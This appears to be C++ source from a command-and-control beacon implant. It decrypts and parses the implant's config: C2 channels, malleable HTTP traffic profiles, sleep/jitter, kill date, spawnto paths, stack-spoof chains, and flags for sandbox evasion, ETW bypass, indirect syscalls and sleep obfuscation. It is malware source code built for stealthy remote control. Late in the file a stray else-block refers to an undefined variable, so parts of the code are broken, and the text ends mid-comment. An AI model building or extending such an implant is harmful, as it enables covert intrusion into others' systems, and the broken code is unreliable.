/*
 * config_parser.cpp
 * Implementation of PCFG config parsing functions.
 * All string fields are allocated via __malloc - caller must freeConfig() on exit.
 */

#include "../include/config_parser.h"
#include "../libs/bastia/bastia.h"
#include "../include/utils.h"

/* ============================================================================
 * Helper: Allocate and copy a null-terminated string from binary data
 * ============================================================================ */

static char* allocString(const uint8_t* data, uint8_t len) {
    if (len == 0) {
        char* empty = (char*)__malloc(1);
        if (empty) empty[0] = '\0';
        return empty;
    }
    char* buf = (char*)__malloc(len + 1);
    if (!buf) return nullptr;
    __memcpy(buf, data, len);
    buf[len] = '\0';
    return buf;
}

/* ============================================================================
 * Helper: Free an allocated string
 * ============================================================================ */
#define freeStr(ptr) \
    if (ptr) { __free(ptr); ptr = nullptr; }

/* ============================================================================
 * Helper: Free HTTP_header linked list
 * ============================================================================ */

static void freeHeaderList(HTTP_header*& head) {
    HTTP_header* cur = head;
    while (cur) {
        HTTP_header* next = cur->next;
        freeStr(cur->header);
        freeStr(cur->value);
        __free(cur);
        cur = next;
    }
    head = nullptr;
}

static void cleanupMalleableBlock(PCFG_ChannelMalleable* mcfg) {
    freeStr(mcfg->wrapper_prefix);
    freeStr(mcfg->wrapper_suffix);
    freeHeaderList(mcfg->headers);
    freeStr(mcfg->payload_location.param_name);
    freeStr(mcfg->payload_location.path_prefix);
    freeStr(mcfg->payload_location.path_suffix);
    freeStr(mcfg->payload_location.cookie_name);
    __memset(mcfg, 0, sizeof(*mcfg));
}

/* ============================================================================
 * Helper: Parse malleable config block from binary data
 * Writes into a PCFG_ChannelMalleable (allocated strings)
 * Returns bytes consumed, or 0 on failure (with full cleanup).
 * ============================================================================ */

static size_t parseMalleableBlock(const uint8_t* data, size_t data_len, PCFG_ChannelMalleable* mcfg) {
    size_t offset = 0;
    if (offset + 4 > data_len) return 0;

    // Wrapper prefix (uint16_t LE)
    uint16_t prefix_len = data[offset] | (data[offset + 1] << 8);
    offset += 2;
    mcfg->wrapper_prefix = allocString(data + offset, prefix_len);
    if (!mcfg->wrapper_prefix) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->wrapper_prefix_len = prefix_len;
    offset += prefix_len;

    // Wrapper suffix (uint16_t LE)
    if (offset + 2 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    uint16_t suffix_len = data[offset] | (data[offset + 1] << 8);
    offset += 2;
    mcfg->wrapper_suffix = allocString(data + offset, suffix_len);
    if (!mcfg->wrapper_suffix) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->wrapper_suffix_len = suffix_len;
    offset += suffix_len;

    // HTTP headers (count)
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->numHeaders = data[offset++];
    mcfg->headers = nullptr;

    HTTP_header* tail = nullptr;
    for (uint8_t i = 0; i < mcfg->numHeaders; i++) {
        if (offset + 2 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
        uint8_t name_len = data[offset++];
        uint8_t value_len = data[offset++];

        HTTP_header* hdr = (HTTP_header*)__malloc(sizeof(HTTP_header));
        if (!hdr) { cleanupMalleableBlock(mcfg); return 0; }
        hdr->next = nullptr;
        hdr->header = allocString(data + offset, name_len);
        if (!hdr->header) { __free(hdr); cleanupMalleableBlock(mcfg); return 0; }
        hdr->headerLen = name_len;
        offset += name_len;
        hdr->value = allocString(data + offset, value_len);
        if (!hdr->value) { freeStr(hdr->header); __free(hdr); cleanupMalleableBlock(mcfg); return 0; }
        hdr->valueLen = value_len;
        offset += value_len;

        if (!tail) {
            mcfg->headers = hdr;
            tail = hdr;
        } else {
            tail->next = hdr;
            tail = hdr;
        }
    }

    // Payload location
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->payload_location.type = static_cast<PCFG_LOCATION_TYPE>(data[offset++]);

    // param_name
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    uint8_t pn_len = data[offset++];
    mcfg->payload_location.param_name = allocString(data + offset, pn_len);
    if (!mcfg->payload_location.param_name) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->payload_location.param_name_len = pn_len;
    offset += pn_len;

    // path_prefix
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    uint8_t pp_len = data[offset++];
    mcfg->payload_location.path_prefix = allocString(data + offset, pp_len);
    if (!mcfg->payload_location.path_prefix) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->payload_location.path_prefix_len = pp_len;
    offset += pp_len;

    // path_suffix
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    uint8_t ps_len = data[offset++];
    mcfg->payload_location.path_suffix = allocString(data + offset, ps_len);
    if (!mcfg->payload_location.path_suffix) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->payload_location.path_suffix_len = ps_len;
    offset += ps_len;

    // body_content_type
    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
    mcfg->payload_location.body_content_type = static_cast<PCFG_BODY_CONTENT_TYPE>(data[offset++]);

    // cookie_name (optional)
    mcfg->payload_location.cookie_name = nullptr;
    mcfg->payload_location.cookie_name_len = 0;
    if (offset + 1 <= data_len) {
        uint8_t cn_len = data[offset++];
        if (cn_len > 0) {
            if (offset + cn_len > data_len) { cleanupMalleableBlock(mcfg); return 0; }
            mcfg->payload_location.cookie_name = allocString(data + offset, cn_len);
            if (!mcfg->payload_location.cookie_name) { cleanupMalleableBlock(mcfg); return 0; }
            mcfg->payload_location.cookie_name_len = cn_len;
            offset += cn_len;
        }
    }

    return offset;
}

/* ============================================================================
 * parseC2Channel - Parse C2 channel from binary data
 * ============================================================================ */

size_t parseC2Channel(const uint8_t* data, size_t data_len,
                      PCFG_C2Channel* channel,
                      PCFG_ChannelMalleable* pollMalleable,
                      PCFG_ChannelMalleable* submitMalleable,
                      PCFG_ChannelMalleable* pollRespMalleable,
                      PCFG_ChannelMalleable* submitRespMalleable)
{
    if (data_len < 14) return 0;  // Minimum: 13 header bytes + at least 1 byte of strings

    size_t offset = 0;

    // Read type
    channel->type = static_cast<PCFG_ChannelType>(data[offset++]);
    if (channel->type < PCFG_ChannelType::HTTP || channel->type > PCFG_ChannelType::PIPE) {
        return 0;
    }

    // Read string lengths (no http_method byte now)
    channel->host_len = data[offset++];
    channel->poll_path_len = data[offset++];
    channel->submit_path_len = data[offset++];
    channel->ua_len = data[offset++];

    // Skip reserved byte
    offset++;

    // Read port (little-endian)
    if (offset + 2 > data_len) return 0;
    channel->port = data[offset] | (data[offset + 1] << 8);
    offset += 2;

    // Read max_consecutive_failures
    if (offset + 1 > data_len) return 0;
    channel->max_consecutive_failures = data[offset++];

    // Read backoff_sleep_ms (little-endian)
    if (offset + 4 > data_len) return 0;
    channel->backoff_sleep_ms = data[offset] | (data[offset + 1] << 8) |
                                (data[offset + 2] << 16) | (data[offset + 3] << 24);
    offset += 4;

    // Validate we have enough data for strings
    size_t strings_len = channel->host_len + channel->poll_path_len + channel->submit_path_len + channel->ua_len;
    if (offset + strings_len > data_len) return 0;

    // Allocate and read host string
    channel->host = allocString(data + offset, channel->host_len);
    if (!channel->host) return 0;
    offset += channel->host_len;

    // Allocate and read poll_path string
    channel->poll_path = allocString(data + offset, channel->poll_path_len);
    if (!channel->poll_path) { freeStr(channel->host); return 0; }
    offset += channel->poll_path_len;

    // Allocate and read submit_path string
    channel->submit_path = allocString(data + offset, channel->submit_path_len);
    if (!channel->submit_path) { freeStr(channel->host); freeStr(channel->poll_path); return 0; }
    offset += channel->submit_path_len;

    // Allocate and read user_agent string
    channel->user_agent = allocString(data + offset, channel->ua_len);
    if (!channel->user_agent) { freeStr(channel->host); freeStr(channel->poll_path); freeStr(channel->submit_path); return 0; }
    offset += channel->ua_len;

    // ---- Sub-helper to avoid repetitive cleanup code ----
    auto cleanup = [&]() {
        freeStr(channel->host);
        freeStr(channel->poll_path);
        freeStr(channel->submit_path);
        freeStr(channel->user_agent);
    };

    // Read poll_malleable_mode byte
    if (offset + 1 > data_len) { cleanup(); return 0; }
    channel->poll_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);

    // Parse inline poll malleable if present
    if (channel->poll_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && pollMalleable) {
        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, pollMalleable);
        if (consumed == 0) { cleanup(); return 0; }
        offset += consumed;
    }

    // Read submit_malleable_mode byte
    if (offset + 1 > data_len) { cleanup(); return 0; }
    channel->submit_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);

    // Parse inline submit malleable if present
    if (channel->submit_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && submitMalleable) {
        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, submitMalleable);
        if (consumed == 0) { cleanup(); return 0; }
        offset += consumed;
    }

    // Read poll_response_malleable_mode byte
    if (offset + 1 > data_len) { cleanup(); return 0; }
    channel->poll_response_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);

    // Parse inline poll response malleable if present
    if (channel->poll_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && pollRespMalleable) {
        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, pollRespMalleable);
        if (consumed == 0) { cleanup(); return 0; }
        offset += consumed;
    }

    // Read submit_response_malleable_mode byte
    if (offset + 1 > data_len) { cleanup(); return 0; }
    channel->submit_response_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);

    // Parse inline submit response malleable if present
    if (channel->submit_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && submitRespMalleable) {
        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, submitRespMalleable);
        if (consumed == 0) { cleanup(); return 0; }
        offset += consumed;
    }

    return offset;
}

/* ============================================================================
 * freeConfig - Free all dynamically allocated fields in BeaconConfig
 * ============================================================================ */

void freeConfig(BeaconConfig* config) {
    if (!config) return;

    // Free channel strings and per-channel malleable
    if (config->channels) {
        for (uint8_t i = 0; i < config->channel_count; i++) {
            PCFG_C2Channel* ch = &config->channels[i];
            freeStr(ch->host);
            freeStr(ch->poll_path);
            freeStr(ch->submit_path);
            freeStr(ch->user_agent);

            // Free per-channel poll malleable
            if (config->channel_poll_malleable) {
                PCFG_ChannelMalleable* cm = &config->channel_poll_malleable[i];
                freeStr(cm->wrapper_prefix);
                freeStr(cm->wrapper_suffix);
                freeHeaderList(cm->headers);
                freeStr(cm->payload_location.param_name);
                freeStr(cm->payload_location.path_prefix);
                freeStr(cm->payload_location.path_suffix);
                freeStr(cm->payload_location.cookie_name);
            }

            // Free per-channel submit malleable
            if (config->channel_submit_malleable) {
                PCFG_ChannelMalleable* cm = &config->channel_submit_malleable[i];
                freeStr(cm->wrapper_prefix);
                freeStr(cm->wrapper_suffix);
                freeHeaderList(cm->headers);
                freeStr(cm->payload_location.param_name);
                freeStr(cm->payload_location.path_prefix);
                freeStr(cm->payload_location.path_suffix);
                freeStr(cm->payload_location.cookie_name);
            }

            // Free per-channel poll response malleable
            if (config->channel_poll_response_malleable) {
                PCFG_ChannelMalleable* rm = &config->channel_poll_response_malleable[i];
                freeStr(rm->wrapper_prefix);
                freeStr(rm->wrapper_suffix);
                freeHeaderList(rm->headers);
                freeStr(rm->payload_location.param_name);
                freeStr(rm->payload_location.path_prefix);
                freeStr(rm->payload_location.path_suffix);
                freeStr(rm->payload_location.cookie_name);
            }

            // Free per-channel submit response malleable
            if (config->channel_submit_response_malleable) {
                PCFG_ChannelMalleable* rm = &config->channel_submit_response_malleable[i];
                freeStr(rm->wrapper_prefix);
                freeStr(rm->wrapper_suffix);
                freeHeaderList(rm->headers);
                freeStr(rm->payload_location.param_name);
                freeStr(rm->payload_location.path_prefix);
                freeStr(rm->payload_location.path_suffix);
                freeStr(rm->payload_location.cookie_name);
            }
        }
        __free(config->channels);
        config->channels = nullptr;
    }

    // Free per-channel malleable arrays
    if (config->channel_poll_malleable) {
        __free(config->channel_poll_malleable);
        config->channel_poll_malleable = nullptr;
    }
    if (config->channel_submit_malleable) {
        __free(config->channel_submit_malleable);
        config->channel_submit_malleable = nullptr;
    }
    if (config->channel_poll_response_malleable) {
        __free(config->channel_poll_response_malleable);
        config->channel_poll_response_malleable = nullptr;
    }
    if (config->channel_submit_response_malleable) {
        __free(config->channel_submit_response_malleable);
        config->channel_submit_response_malleable = nullptr;
    }

    // Free global poll malleable
    freeStr(config->global_poll_malleable.wrapper_prefix);
    freeStr(config->global_poll_malleable.wrapper_suffix);
    freeHeaderList(config->global_poll_malleable.headers);
    freeStr(config->global_poll_malleable.payload_location.param_name);
    freeStr(config->global_poll_malleable.payload_location.path_prefix);
    freeStr(config->global_poll_malleable.payload_location.path_suffix);
    freeStr(config->global_poll_malleable.payload_location.cookie_name);

    // Free global submit malleable
    freeStr(config->global_submit_malleable.wrapper_prefix);
    freeStr(config->global_submit_malleable.wrapper_suffix);
    freeHeaderList(config->global_submit_malleable.headers);
    freeStr(config->global_submit_malleable.payload_location.param_name);
    freeStr(config->global_submit_malleable.payload_location.path_prefix);
    freeStr(config->global_submit_malleable.payload_location.path_suffix);
    freeStr(config->global_submit_malleable.payload_location.cookie_name);

    // Free global poll response malleable
    freeStr(config->global_poll_response_malleable.wrapper_prefix);
    freeStr(config->global_poll_response_malleable.wrapper_suffix);
    freeHeaderList(config->global_poll_response_malleable.headers);
    freeStr(config->global_poll_response_malleable.payload_location.param_name);
    freeStr(config->global_poll_response_malleable.payload_location.path_prefix);
    freeStr(config->global_poll_response_malleable.payload_location.path_suffix);
    freeStr(config->global_poll_response_malleable.payload_location.cookie_name);

    // Free global submit response malleable
    freeStr(config->global_submit_response_malleable.wrapper_prefix);
    freeStr(config->global_submit_response_malleable.wrapper_suffix);
    freeHeaderList(config->global_submit_response_malleable.headers);
    freeStr(config->global_submit_response_malleable.payload_location.param_name);
    freeStr(config->global_submit_response_malleable.payload_location.path_prefix);
    freeStr(config->global_submit_response_malleable.payload_location.path_suffix);
    freeStr(config->global_submit_response_malleable.payload_location.cookie_name);

    // Free indirect_pivot
    if (config->indirect_pivot) {
        __free(config->indirect_pivot);
        config->indirect_pivot = nullptr;
    }

    // Free spawnto strings
    freeStr(config->spawnto_x64);
    freeStr(config->spawnto_x86);

    // Free stack spoof chain
    if (config->stack_chain) {
        for (uint16_t i = 0; i < config->stack_chain_count; i++) {
            freeStr(config->stack_chain[i].module);
            freeStr(config->stack_chain[i].function);
        }
        __free(config->stack_chain);
        config->stack_chain = nullptr;
    }

    // Free in-memory append strings
    if (config->in_memory_append) {
        for (uint8_t i = 0; i < config->in_memory_append_count; i++) {
            freeStr(config->in_memory_append[i]);
        }
        __free(config->in_memory_append);
        config->in_memory_append = nullptr;
        config->in_memory_append_count = 0;
    }
}

/* ============================================================================
 * parseConfig - Parse complete config blob into BeaconConfig struct
 * ============================================================================ */

bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_len, BeaconConfig* config) {
    (void)functionTable;  // Only used in v1 (removed)

    if (!blob || blob_len < 6 || !config) {
        return false;
    }

    // Read magic and version from first 6 bytes
    uint32_t magic = blob[0] | (blob[1] << 8) | (blob[2] << 16) | (blob[3] << 24);
    uint16_t version = blob[4] | (blob[5] << 8);

    if (magic != PCFG_MAGIC) {
        return false;
    }

    if (version == PCFG_VERSION_XCHACHA) {
        // ===== V2: XChaCha20-Poly1305 encrypted =====
        if (blob_len < sizeof(PCFG_Header) + 16) {
            return false;
        }

        const PCFG_Header* header = reinterpret_cast<const PCFG_Header*>(blob);

        // Decrypt payload (max 2048 bytes for config)
        uint8_t decrypted[2048];
        if (header->ciphertext_len + 16 > sizeof(decrypted)) {
            return false;
        }

        const uint8_t* ciphertext = blob + sizeof(PCFG_Header);

        size_t decrypted_len = 0;
        int result = xchacha20poly1305_decrypt(
            decrypted, &decrypted_len,
            ciphertext, header->ciphertext_len + 16,
            nullptr, 0,
            header->nonce, CONFIG_DECRYPT_KEY
        );

        if (result != 0) {
            return false;
        }

        size_t payload_len = decrypted_len;
        size_t offset = 0;

        // --- Read beacon_id (8 bytes) ---
        if (offset + 8 > payload_len) return false;
        for (int i = 0; i < 8; i++) config->beacon_id[i] = decrypted[offset + i];
        offset += 8;

        // --- Read crypto_key (32 bytes) ---
        if (offset + 32 > payload_len) return false;
        for (int i = 0; i < 32; i++) config->crypto_key[i] = decrypted[offset + i];
        offset += 32;

        // --- Read channel_count ---
        if (offset + 1 > payload_len) return false;
        config->channel_count = decrypted[offset++];

        // --- Allocate channels array ---
        config->channels = (PCFG_C2Channel*)__malloc(sizeof(PCFG_C2Channel) * config->channel_count);
        if (!config->channels) return false;
        __memset(config->channels, 0, sizeof(PCFG_C2Channel) * config->channel_count);

        // Helper lambda for freeing a malleable block on error
        auto freePerChannelMalleable = [](PCFG_ChannelMalleable* arr, uint8_t count) {
            if (!arr) return;
            for (uint8_t j = 0; j < count; j++) {
                PCFG_ChannelMalleable* cm = &arr[j];
                freeStr(cm->wrapper_prefix);
                freeStr(cm->wrapper_suffix);
                freeHeaderList(cm->headers);
                freeStr(cm->payload_location.param_name);
                freeStr(cm->payload_location.path_prefix);
                freeStr(cm->payload_location.path_suffix);
                freeStr(cm->payload_location.cookie_name);
            }
        };

        // --- Allocate per-channel poll malleable array ---
        config->channel_poll_malleable = (PCFG_ChannelMalleable*)__malloc(
            sizeof(PCFG_ChannelMalleable) * config->channel_count);
        if (!config->channel_poll_malleable) {
            __free(config->channels); config->channels = nullptr;
            return false;
        }
        __memset(config->channel_poll_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);

        // --- Allocate per-channel submit malleable array ---
        config->channel_submit_malleable = (PCFG_ChannelMalleable*)__malloc(
            sizeof(PCFG_ChannelMalleable) * config->channel_count);
        if (!config->channel_submit_malleable) {
            __free(config->channels); config->channels = nullptr;
            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
            return false;
        }
        __memset(config->channel_submit_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);

        // --- Allocate per-channel poll response malleable array ---
        config->channel_poll_response_malleable = (PCFG_ChannelMalleable*)__malloc(
            sizeof(PCFG_ChannelMalleable) * config->channel_count);
        if (!config->channel_poll_response_malleable) {
            __free(config->channels); config->channels = nullptr;
            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
            __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
            return false;
        }
        __memset(config->channel_poll_response_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);

        // --- Allocate per-channel submit response malleable array ---
        config->channel_submit_response_malleable = (PCFG_ChannelMalleable*)__malloc(
            sizeof(PCFG_ChannelMalleable) * config->channel_count);
        if (!config->channel_submit_response_malleable) {
            __free(config->channels); config->channels = nullptr;
            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
            __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
            __free(config->channel_poll_response_malleable); config->channel_poll_response_malleable = nullptr;
            return false;
        }
        __memset(config->channel_submit_response_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);

        // --- Parse each channel ---
        for (uint8_t i = 0; i < config->channel_count; i++) {
            size_t consumed = parseC2Channel(
                decrypted + offset, payload_len - offset,
                &config->channels[i],
                &config->channel_poll_malleable[i],
                &config->channel_submit_malleable[i],
                &config->channel_poll_response_malleable[i],
                &config->channel_submit_response_malleable[i]);
            if (consumed == 0) {
                // Cleanup on failure
                for (uint8_t j = 0; j < i; j++) {
                    freeStr(config->channels[j].host);
                    freeStr(config->channels[j].poll_path);
                    freeStr(config->channels[j].submit_path);
                    freeStr(config->channels[j].user_agent);
                }
                freePerChannelMalleable(config->channel_poll_malleable, i);
                freePerChannelMalleable(config->channel_submit_malleable, i);
                freePerChannelMalleable(config->channel_poll_response_malleable, i);
                freePerChannelMalleable(config->channel_submit_response_malleable, i);
                __free(config->channels); config->channels = nullptr;
                __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
                __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
                __free(config->channel_poll_response_malleable); config->channel_poll_response_malleable = nullptr;
                __free(config->channel_submit_response_malleable); config->channel_submit_response_malleable = nullptr;
                return false;
            }
            offset += consumed;
        }

        // --- Read sleep_ms ---
        if (offset + 4 > payload_len) return false;
        config->sleep_ms = decrypted[offset] | (decrypted[offset + 1] << 8) |
                           (decrypted[offset + 2] << 16) | (decrypted[offset + 3] << 24);
        offset += 4;

        // --- Read jitter_pct ---
        if (offset + 1 > payload_len) return false;
        config->jitter_pct = decrypted[offset++];

        // --- Read kill_date ---
        if (offset + 4 > payload_len) return false;
        config->kill_date = decrypted[offset] | (decrypted[offset + 1] << 8) |
                            (decrypted[offset + 2] << 16) | (decrypted[offset + 3] << 24);
        offset += 4;

        // --- Read options ---
        if (offset + 2 > payload_len) return false;
        uint16_t options_val = decrypted[offset] | (decrypted[offset + 1] << 8);
        config->options.sandbox_evasion       = (options_val >>  0) & 1;
        config->options.debug_mode            = (options_val >>  1) & 1;
        config->options.kill_date_set         = (options_val >>  2) & 1;
        config->options.validate_ssl          = (options_val >>  3) & 1;
        config->options.bypass_etw            = (options_val >>  4) & 1;
        config->options.use_indirect_syscalls = (options_val >>  5) & 1;
        config->options.lazy_checkin          = (options_val >>  6) & 1;
        config->options.lazy_unhook           = (options_val >>  7) & 1;
        config->options.sleep_obfuscation     = (options_val >>  8) & 3;
        config->options.sleep_wipe_pe_headers = (options_val >> 10) & 1;
        config->options.sleep_stack_spoof     = (options_val >> 11) & 1;
        config->options.pad                   = (options_val >> 12) & 1;
        config->options.reserved              = 0;
        offset += 2;

        // --- Read lazy_checkin_max ---
        if (offset + 1 > payload_len) return false;
        config->lazy_checkin_max = decrypted[offset++];

        // --- Read indirect_pivot_len ---
        if (offset + 1 > payload_len) return false;
        config->indirect_pivot_len = decrypted[offset++];

        // --- Read indirect_pivot (variable length) ---
        config->indirect_pivot = nullptr;
        if (config->indirect_pivot_len > 0) {
            if (offset + config->indirect_pivot_len > payload_len) return false;
            config->indirect_pivot = (char*)__malloc(config->indirect_pivot_len + 1);
            if (!config->indirect_pivot) return false;
            __memcpy(config->indirect_pivot, decrypted + offset, config->indirect_pivot_len);
            config->indirect_pivot[config->indirect_pivot_len] = '\0';
            offset += config->indirect_pivot_len;
            config->options.indirect_pivot_set = 1;
        }

        // --- Read pad_max (2 bytes) ---
        if (offset + 2 <= payload_len) {
            config->pad_max = decrypted[offset] | (decrypted[offset + 1] << 8);
            offset += 2;
        } else {
            config->pad_max = 0;
        }

        // --- Read num_spoof_frames (2 bytes) ---
        if (offset + 2 <= payload_len) {
            config->num_spoof_frames = decrypted[offset] | (decrypted[offset + 1] << 8);
            offset += 2;
        } else {
            config->num_spoof_frames = 0;
        }

        // --- Read max_response_size (4 bytes) ---
        if (offset + 4 <= payload_len) {
            config->max_response_size = (uint32_t)decrypted[offset]
                | ((uint32_t)decrypted[offset + 1] << 8)
                | ((uint32_t)decrypted[offset + 2] << 16)
                | ((uint32_t)decrypted[offset + 3] << 24);
            offset += 4;
        } else {
            config->max_response_size = 67108864;  // 64MB default
        }

        // --- Read spawnto_x64 (len + string) ---
        config->spawnto_x64 = nullptr;
        config->spawnto_x64_len = 0;
        if (offset + 1 <= payload_len) {
            config->spawnto_x64_len = decrypted[offset++];
            if (config->spawnto_x64_len > 0) {
                if (offset + config->spawnto_x64_len > payload_len) return false;
                config->spawnto_x64 = (char*)__malloc(config->spawnto_x64_len + 1);
                if (!config->spawnto_x64) return false;
                __memcpy(config->spawnto_x64, decrypted + offset, config->spawnto_x64_len);
                config->spawnto_x64[config->spawnto_x64_len] = '\0';
                offset += config->spawnto_x64_len;
                c_debugPrint(functionTable, "[parseConfig] spawnto_x64: %s", config->spawnto_x64);
            }
        }

        // --- Read spawnto_x86 (len + string) ---
        config->spawnto_x86 = nullptr;
        config->spawnto_x86_len = 0;
        if (offset + 1 <= payload_len) {
            config->spawnto_x86_len = decrypted[offset++];
            if (config->spawnto_x86_len > 0) {
                if (offset + config->spawnto_x86_len > payload_len) return false;
                config->spawnto_x86 = (char*)__malloc(config->spawnto_x86_len + 1);
                if (!config->spawnto_x86) return false;
                __memcpy(config->spawnto_x86, decrypted + offset, config->spawnto_x86_len);
                config->spawnto_x86[config->spawnto_x86_len] = '\0';
                offset += config->spawnto_x86_len;
                c_debugPrint(functionTable, "[parseConfig] spawnto_x86: %s", config->spawnto_x86);
            }
        }

        // Guard: if lazy_checkin enabled but max is 0, disable to avoid div-by-zero
        if (config->options.lazy_checkin && config->lazy_checkin_max == 0) {
            config->options.lazy_checkin = 0;
        }

        // --- Helper lambda for parsing a global malleable block ---
        auto parseGlobalMalleable = [&](const char* label, PCFG_ChannelMalleable* out, bool* has_out) -> bool {
            *has_out = false;
            __memset(out, 0, sizeof(PCFG_ChannelMalleable));
            if (offset + 1 <= payload_len) {
                uint8_t present = decrypted[offset++];
                if (present == true) {
                    c_debugPrint(functionTable, "[parseConfig] Found global %s malleable block, parsing...", label);
                    size_t consumed = parseMalleableBlock(decrypted + offset, payload_len - offset, out);
                    if (consumed == 0) {
                        c_debugPrint(functionTable, "[parseConfig] Failed to parse global %s malleable block", label);
                        return false;
                    }
                    *has_out = true;
                    offset += consumed;
                    c_debugPrint(functionTable, "[parseConfig] Global %s malleable parsed", label);
                    return true;
                } else {
                    c_debugPrint(functionTable, "[parseConfig] No global %s malleable (0x%02x)", label, (unsigned)present);
                }
            }
            return false;
        };

        // --- Read global poll malleable ---
        parseGlobalMalleable("poll", &config->global_poll_malleable, &config->has_poll_malleable_config);

        // --- Read global submit malleable ---
        parseGlobalMalleable("submit", &config->global_submit_malleable, &config->has_submit_malleable_config);

        // --- Read global poll response malleable ---
        parseGlobalMalleable("poll_response", &config->global_poll_response_malleable, &config->has_poll_response_malleable_config);

        // --- Read global submit response malleable ---
        parseGlobalMalleable("submit_response", &config->global_submit_response_malleable, &config->has_submit_response_malleable_config);
            } else {
                c_debugPrint(functionTable, "[parseConfig] No global malleable (has_global=0x%02x)", (unsigned)has_global);
            }
        }

        // --- Read has_global_response_malleable ---
        config->has_response_malleable_config = false;
        __memset(&config->global_response_malleable, 0, sizeof(PCFG_ChannelMalleable));

        if (offset + 1 <= payload_len) {
            uint8_t has_global_resp = decrypted[offset++];
            if (has_global_resp == true) {
                c_debugPrint(functionTable, "[parseConfig] Found global response malleable block, parsing...");
                size_t consumed = parseMalleableBlock(decrypted + offset, payload_len - offset,
                    &config->global_response_malleable);
                if (consumed == 0) {
                    c_debugPrint(functionTable, "[parseConfig] Failed to parse global response malleable block");
                } else {
                    config->has_response_malleable_config = true;
                    offset += consumed;
                    c_debugPrint(functionTable, "[parseConfig] Global response malleable parsed");
                }
            } else {
                c_debugPrint(functionTable, "[parseConfig] No global response malleable (has_global_resp=0x%02x)", (unsigned)has_global_resp);
            }
        }

        // --- Read Work Hours (6 bytes) ---
        if (offset + 6 <= payload_len) {
            config->work_hours.enabled = decrypted[offset++];
            config->work_hours.start_hour = decrypted[offset++];
            config->work_hours.start_minute = decrypted[offset++];
            config->work_hours.end_hour = decrypted[offset++];
            config->work_hours.end_minute = decrypted[offset++];
            config->work_hours.insomnia = decrypted[offset++];
            c_debugPrint(functionTable, "[parseConfig] Work hours: enabled=%u, %02u:%02u-%02u:%02u, insomnia=%u",
                (unsigned)config->work_hours.enabled,
                (unsigned)config->work_hours.start_hour,
                (unsigned)config->work_hours.start_minute,
                (unsigned)config->work_hours.end_hour,
                (unsigned)config->work_hours.end_minute,
                (unsigned)config->work_hours.insomnia);
        } else {
            // Default to disabled if not present
            config->work_hours.enabled = 0;
            config->work_hours.start_hour = 9;
            config->work_hours.start_minute = 0;
            config->work_hours.end_hour = 17;
            config->work_hours.end_minute = 0;
            config->work_hours.insomnia = 0;
        }

        // --- Read stack spoof chain (2 byte count + per-entry module/func pairs) ---
        config->stack_chain_count = 0;
        config->stack_chain = nullptr;
        if (offset + 2 <= payload_len) {
            uint16_t chainCount = decrypted[offset] | (decrypted[offset + 1] << 8);
            offset += 2;
            if (chainCount > 0 && chainCount <= 256) {
                config->stack_chain = (StackChainEntry*)__malloc(sizeof(StackChainEntry) * chainCount);
                if (config->stack_chain) {
                    config->stack_chain_count = chainCount;
                    for (uint16_t ci = 0; ci < chainCount; ci++) {
                        StackChainEntry* e = &config->stack_chain[ci];
                        e->module = nullptr;
                        e->function = nullptr;
                        e->resolvedAddr = 0;
                        e->offset = 0;
                        if (offset + 6 > payload_len) break;
                        e->offset = decrypted[offset] | (decrypted[offset + 1] << 8) |
                                    (decrypted[offset + 2] << 16) | (decrypted[offset + 3] << 24);
                        offset += 4;
                        uint8_t modLen = decrypted[offset++];
                        e->module = allocString(decrypted + offset, modLen);
                        offset += modLen;
                        uint8_t fnLen = decrypted[offset++];
                        e->function = allocString(decrypted + offset, fnLen);
                        offset += fnLen;
                    }
                }
            }
        }

        // --- Read in-memory append strings (1 byte count + per-string len(2) + data) ---
        config->in_memory_append_count = 0;
        config->in_memory_append = nullptr;
        if (offset + 1 <= payload_len) {
            uint8_t imCount = decrypted[offset++];
            if (imCount > 0 && imCount <= 64) {
                config->in_memory_append = (char**)__malloc(sizeof(char*) * imCount);
                if (config->in_memory_append) {
                    config->in_memory_append_count = imCount;
                    for (uint8_t i = 0; i < imCount; i++) {
                        config->in_memory_append[i] = nullptr;
                        if (offset + 2 > payload_len) break;
                        uint16_t strLen = decrypted[offset] | (decrypted[offset + 1] << 8);
                        offset += 2;
                        if (offset + strLen > payload_len) break;
                        config->in_memory_append[i] = allocString(decrypted + offset, strLen);
                        offset += strLen;
                    }
                }
            }
        }

        return true;
    }
    /*historical fun fact:
